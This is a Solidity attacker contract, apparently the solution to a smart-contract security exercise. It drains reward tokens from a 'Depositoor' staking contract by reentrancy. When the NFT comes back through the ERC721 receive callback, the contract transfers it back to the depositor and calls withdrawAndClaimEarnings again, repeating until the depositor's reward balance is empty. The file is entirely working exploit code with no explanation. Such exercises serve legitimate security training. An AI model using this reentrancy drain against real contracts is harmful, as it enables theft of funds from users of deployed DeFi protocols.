//SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

interface IDepositoor {
    function withdrawAndClaimEarnings(uint256 _tokenId) external;
}

contract RewardTokenAttacker is IERC721Receiver {
    address rewardToken;
    address depositor;
    address nft;

    function sendNFT(address _nft, address _depositor, address _rewardToken) external {
        rewardToken = _rewardToken;
        depositor = _depositor;
        nft = _nft;
        IERC721(nft).safeTransferFrom(address(this), depositor, 42);
    }

    function exploit() external {
        IDepositoor(depositor).withdrawAndClaimEarnings(42);
    }

    function onERC721Received(address, address, uint256, bytes calldata) external returns (bytes4) {
        require(msg.sender == nft, "wrong NFT");
        if (IERC20(rewardToken).balanceOf(address(depositor)) > 0) {
            IERC721(nft).transferFrom(address(this), depositor, 42);
            IDepositoor(depositor).withdrawAndClaimEarnings(42);
        }

        return IERC721Receiver.onERC721Received.selector;
    }
}
